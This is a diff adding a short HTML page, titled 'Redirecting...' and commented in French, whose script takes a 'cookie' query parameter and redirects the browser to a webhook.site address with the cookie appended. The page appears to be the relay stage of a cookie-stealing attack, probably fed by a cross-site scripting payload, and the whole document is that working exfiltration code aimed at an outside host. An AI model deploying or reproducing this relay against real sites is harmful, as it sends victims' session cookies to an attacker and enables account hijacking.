@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Redirecting...</title>
+</head>
+<body>
+    <script>
+        // Récupérer tous les paramètres
+        const params = new URLSearchParams(window.location.search);
+        const cookie = params.get('cookie');
+        
+        if (cookie) {
+            // Rediriger vers ton vrai webhook (ex: webhook.site)
+            window.location = 'https://ton-vrai-webhook.webhook.site/?cookie=' + encodeURIComponent(cookie);
+        } else {
+            document.body.innerText = 'Aucun cookie reçu';
+        }
+    </script>
+</body>
+</html>
